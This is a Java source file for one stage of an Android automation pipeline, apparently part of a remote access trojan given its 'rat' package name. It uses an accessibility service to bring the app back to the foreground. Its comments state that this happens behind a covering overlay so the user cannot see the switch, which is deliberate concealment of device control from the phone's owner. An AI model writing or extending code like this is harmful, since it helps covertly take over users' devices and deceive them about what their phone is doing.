package com.vendor.rat.auto.pipeline.stage;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.vendor.rat.auto.pipeline.PipelineContext;
import com.vendor.rat.auto.pipeline.PipelineStage;
import com.vendor.rat.service.MyAccessibilityService;

/**
 * Stage 6: 导航回应用
 *
 * 引擎完成后，在遮罩遮挡下将 App 带到前台。
 * 用户看不到切换过程（遮罩还在）。
 */
public class NavigateToAppStage implements PipelineStage {

    private static final String TAG = "NavigateToAppStage";

    @Override
    public void handle(PipelineContext passable, Runnable next) {
        MyAccessibilityService svc = passable.getService();
        Context appCtx = passable.getAppContext();

        // 清除 shutdownNow 设置的中断标志
        Thread.interrupted();

        try {
            Intent launchIntent = appCtx.getPackageManager()
                .getLaunchIntentForPackage(appCtx.getPackageName());
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                appCtx.startActivity(launchIntent);
                Log.d(TAG, "App launched to foreground");
            } else if (svc != null) {
                svc.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS);
                Log.d(TAG, "RECENTS fallback");
            }
        } catch (Exception e) {
            Log.w(TAG, "Launch failed, trying RECENTS", e);
            if (svc != null) {
                svc.performGlobalAction(
                    android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS);
            }
        }

        // 等待启动动画
        try { Thread.sleep(1000); } catch (InterruptedException ignored) {}

        next.run();
    }
}
